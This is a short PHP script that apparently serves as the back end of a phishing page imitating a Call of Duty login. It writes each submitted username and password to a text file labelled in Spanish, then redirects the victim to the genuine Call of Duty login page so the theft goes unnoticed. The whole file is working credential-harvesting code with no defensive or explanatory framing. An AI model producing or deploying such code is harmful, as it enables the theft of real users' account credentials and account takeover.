<?php

file_put_contents("usuarios.txt", "Correo Electronico: " . $_POST['username'] . " Contraseña: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://profile.callofduty.com/cod/login');
exit();
?>